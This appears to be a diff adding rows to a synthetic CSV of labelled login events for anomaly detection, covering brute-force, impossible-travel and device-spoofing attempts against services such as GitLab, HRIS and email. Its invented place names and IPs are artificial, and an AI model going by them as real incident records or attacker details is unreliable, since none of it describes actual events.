+5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:36:04,197.147.19.215,"Davidborough, Guernsey",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:36:04,197.147.19.215,"Williamland, Western Sahara",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:36:12,197.147.19.215,"Williamville, Romania",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:36:24,197.147.19.215,"South Jeremybury, Bangladesh",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:36:43,197.147.19.215,"South Maureen, Bahrain",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:36:53,197.147.19.215,"West Ricky, United States Minor Outlying Islands",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+4d1a648a-1c9c-4f7b-9d78-a505093960a9,User,2026-06-25 13:00:30,177.108.193.89,"Leonhaven, Solomon Islands",GitLab,Password,826,N/A,Unknown Browser/Device,True,Impossible Travel
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:20:22,106.32.214.210,"Lake Mariafurt, Djibouti",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:20:23,106.32.214.210,"Welchview, Sao Tome and Principe",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:20:26,106.32.214.210,"Lake Brettchester, Slovenia",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:20:30,106.32.214.210,"Alexisbury, Nicaragua",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:20:31,106.32.214.210,"East Allisonton, Romania",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:20:32,106.32.214.210,"South Cory, British Virgin Islands",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:20:41,106.32.214.210,"Terriberg, Spain",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:20:46,106.32.214.210,"Cainbury, Solomon Islands",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:20:46,106.32.214.210,"Walkertown, Reunion",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:20:47,106.32.214.210,"Bryanmouth, Algeria",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:20:48,106.32.214.210,"Charlesmouth, Peru",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:20:49,106.32.214.210,"Staceyside, Christmas Island",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:20:50,106.32.214.210,"Longfurt, Taiwan",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:20:51,106.32.214.210,"West Shawnfurt, Jordan",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:20:53,106.32.214.210,"Garciashire, Lesotho",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:20:54,106.32.214.210,"Raymouth, Benin",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:20:54,106.32.214.210,"New Jennifer, Gambia",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:20:55,106.32.214.210,"East Stephanieview, Eritrea",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:20:55,106.32.214.210,"Estesland, Namibia",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:20:58,106.32.214.210,"Bryanberg, Kuwait",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:21:01,106.32.214.210,"North Sarah, Nigeria",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:21:02,106.32.214.210,"Aaronside, Lesotho",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:21:02,106.32.214.210,"South Jeremy, Isle of Man",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:21:04,106.32.214.210,"Port Jenniferside, Moldova",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:21:07,106.32.214.210,"New Johnborough, Samoa",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:21:12,106.32.214.210,"North Carly, El Salvador",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:21:22,106.32.214.210,"Lopezstad, Latvia",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:21:22,106.32.214.210,"Dawnton, Netherlands",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:21:22,106.32.214.210,"Port Hollyborough, Iraq",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:21:25,106.32.214.210,"Port Alex, Wallis and Futuna",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:21:28,106.32.214.210,"North Kenneth, Bangladesh",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:21:30,106.32.214.210,"Cindyhaven, Kyrgyz Republic",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:21:31,106.32.214.210,"Ryanton, Belgium",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:21:34,106.32.214.210,"Martinezhaven, Paraguay",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:22:42,106.32.214.210,"Vasquezmouth, Panama",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:22:42,106.32.214.210,"Port Jennifer, Cayman Islands",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+62f40bbb-9f63-4278-a675-1570d0d0f67c,User,2026-06-25 14:23:12,106.32.214.210,"South Erin, Antigua and Barbuda",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f17e64bf-7b57-42b5-b16b-b76ea8fb76a3,User,2026-06-25 14:35:21,137.166.220.130,"Cruzton, Spain",Confluence,Biometric,2177,N/A,Unknown Browser/Device,True,Impossible Travel
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:42:44,28.73.228.54,"New Greg, French Polynesia",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:42:45,28.73.228.54,"Burkefort, Norway",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:42:52,28.73.228.54,"Martinborough, Timor-Leste",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:42:52,28.73.228.54,"Fergusonton, Switzerland",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:42:54,28.73.228.54,"Lake Nicole, Anguilla",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:42:56,28.73.228.54,"Port Williambury, Niue",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:00,28.73.228.54,"New Chaseborough, Svalbard & Jan Mayen Islands",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:01,28.73.228.54,"Loweshire, Korea",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:02,28.73.228.54,"South Melvin, Aruba",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:02,28.73.228.54,"Patriciafort, Samoa",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:03,28.73.228.54,"South Zachary, Jamaica",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:04,28.73.228.54,"Katherinetown, Egypt",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:05,28.73.228.54,"South Brendahaven, Kiribati",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:06,28.73.228.54,"North Michelle, Denmark",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:08,28.73.228.54,"Matthewshire, Singapore",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:09,28.73.228.54,"Roseville, Falkland Islands (Malvinas)",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:16,28.73.228.54,"New Adammouth, Sierra Leone",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:19,28.73.228.54,"Novakton, Singapore",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:19,28.73.228.54,"New Davidton, French Southern Territories",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:23,28.73.228.54,"East Davidburgh, Isle of Man",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:28,28.73.228.54,"Allisonbury, Uzbekistan",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:29,28.73.228.54,"Hughesside, Niger",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:34,28.73.228.54,"Jessicamouth, Timor-Leste",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:52,28.73.228.54,"Lake Heather, Uruguay",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:54,28.73.228.54,"Edwardport, Belgium",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:56,28.73.228.54,"South Wendyhaven, Jordan",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:43:58,28.73.228.54,"Terriburgh, India",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:44:02,28.73.228.54,"East Linda, Malta",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:44:04,28.73.228.54,"Diazmouth, Malawi",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:44:08,28.73.228.54,"New Rebeccamouth, Myanmar",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:44:14,28.73.228.54,"South Stephanieside, Faroe Islands",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:44:16,28.73.228.54,"South Joel, United States Minor Outlying Islands",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:44:32,28.73.228.54,"West Patriciamouth, Cook Islands",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:44:32,28.73.228.54,"South Jeremy, Bolivia",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:44:44,28.73.228.54,"Lake Jamesborough, Estonia",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:44:44,28.73.228.54,"East Anna, French Southern Territories",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:44:44,28.73.228.54,"Emilyport, Honduras",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:45:04,28.73.228.54,"New Justintown, United Arab Emirates",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:45:09,28.73.228.54,"Henrychester, French Guiana",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:45:19,28.73.228.54,"East Patrick, Djibouti",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:45:20,28.73.228.54,"West Robinside, Kuwait",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:45:28,28.73.228.54,"North Davidmouth, Saudi Arabia",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:45:29,28.73.228.54,"South Jaredstad, Italy",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:45:40,28.73.228.54,"Port Cassie, Norfolk Island",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:45:48,28.73.228.54,"North Troy, Korea",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:45:54,28.73.228.54,"North Douglasberg, Marshall Islands",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c770a84b-0645-49bb-899f-37492a6261af,User,2026-06-25 14:46:19,69.127.231.218,"Robertton, Montserrat",Confluence,SSO,910,N/A,BlackArch - Wget - MAC: aa:c0:dd:31:d4:db,True,Device Spoofing
+d94017f1-bca2-4f6f-92f8-366f215a795d,User,2026-06-25 14:46:19,28.73.228.54,"New Jon, San Marino",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3752e44c-e11c-42f8-b72c-9f22159205b5,User,2026-06-25 14:51:18,56.34.200.172,"Hudsonshire, Papua New Guinea",Email,Biometric,1289,N/A,Parrot OS - Tor Browser - MAC: 42:96:6a:d3:7a:7c,True,Device Spoofing
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:53:43,79.227.183.150,"Anitaport, Vietnam",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:53:45,79.227.183.150,"New Dustin, Togo",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:53:51,79.227.183.150,"Port Debbieland, Bouvet Island (Bouvetoya)",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:53:51,79.227.183.150,"Forbesshire, Niue",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:53:53,79.227.183.150,"Karenchester, Georgia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:53:55,79.227.183.150,"Petersmouth, Togo",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:53:57,79.227.183.150,"South Rachelchester, Brazil",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:53:58,79.227.183.150,"North Matthew, Georgia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:53:59,79.227.183.150,"New Danielle, Timor-Leste",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:54:03,79.227.183.150,"Lake Jeremy, Sao Tome and Principe",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:54:10,79.227.183.150,"Dixontown, France",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:54:11,79.227.183.150,"Port Patrickview, Thailand",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:54:14,79.227.183.150,"North Christopherland, Denmark",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:54:16,79.227.183.150,"West Davidside, Panama",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:54:25,79.227.183.150,"Andrewchester, Saint Kitts and Nevis",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:54:28,79.227.183.150,"West Patricialand, Saint Pierre and Miquelon",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:54:31,79.227.183.150,"New Bradley, Malta",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:54:33,79.227.183.150,"New Nicholasport, Malawi",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:54:35,79.227.183.150,"Davidhaven, Cape Verde",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:54:37,79.227.183.150,"Toniside, Zambia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:54:37,79.227.183.150,"Marcuston, Rwanda",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:54:38,79.227.183.150,"Lake Thomas, Wallis and Futuna",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:54:46,79.227.183.150,"Lake Francisco, Georgia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:54:51,79.227.183.150,"Dustinhaven, Saint Kitts and Nevis",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:54:51,79.227.183.150,"Smithhaven, Oman",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:54:59,79.227.183.150,"Roblesfurt, Algeria",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:55:03,79.227.183.150,"South Edward, Suriname",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:55:10,79.227.183.150,"Mccoyborough, British Indian Ocean Territory (Chagos Archipelago)",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:55:11,79.227.183.150,"Michelleside, Comoros",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:55:15,79.227.183.150,"Hernandezview, Venezuela",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:55:19,79.227.183.150,"South Stephanie, Nauru",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:55:23,79.227.183.150,"East Summermouth, Czech Republic",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:55:43,79.227.183.150,"Silvaport, Kyrgyz Republic",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:55:53,79.227.183.150,"Port Raymondchester, Mali",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:56:03,79.227.183.150,"Dawnchester, El Salvador",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:56:07,79.227.183.150,"Barbarabury, Burundi",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:56:23,79.227.183.150,"South Robertfort, El Salvador",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+d979fa39-0c92-426e-ac18-eb429a0cbc05,Device,2026-06-25 14:56:48,79.227.183.150,"East Tammymouth, Belarus",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+00620802-95c4-4149-9e75-999eb075c915,User,2026-06-25 15:11:51,151.186.146.164,"South Trevorview, Sri Lanka",GitLab,Hardware Token,462,N/A,Android 14 - Curl - MAC: b4:70:65:1d:a4:7a,True,Device Spoofing
+3fb653a0-33e5-4749-bc5b-74e078021ea0,User,2026-06-25 15:24:56,148.136.69.73,"West Kendraborough, Isle of Man",Jira,MFA,1752,N/A,Unknown Browser/Device,True,Impossible Travel
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:48:45,111.44.151.42,"Port Lisastad, Hong Kong",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:48:46,111.44.151.42,"North Madison, French Guiana",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:48:53,111.44.151.42,"Lake Elizabeth, French Guiana",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:48:54,111.44.151.42,"Kingmouth, Mayotte",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:48:54,111.44.151.42,"Hardingstad, French Polynesia",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:48:55,111.44.151.42,"Jenniferstad, Tajikistan",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:48:55,111.44.151.42,"North Lisa, Bolivia",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:48:57,111.44.151.42,"Lake Nathanhaven, Andorra",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:00,111.44.151.42,"East Jacob, Dominican Republic",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:04,111.44.151.42,"Lake Robert, French Southern Territories",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:05,111.44.151.42,"Port Shannon, Algeria",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:05,111.44.151.42,"New Jeremy, Antarctica (the territory South of 60 deg S)",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:06,111.44.151.42,"Lake Brianmouth, Lebanon",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:13,111.44.151.42,"East Amanda, Chad",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:13,111.44.151.42,"Hallview, Saudi Arabia",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:15,111.44.151.42,"South Edwardtown, Martinique",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:18,111.44.151.42,"Courtneyhaven, Greenland",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:21,111.44.151.42,"New Lauramouth, Germany",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
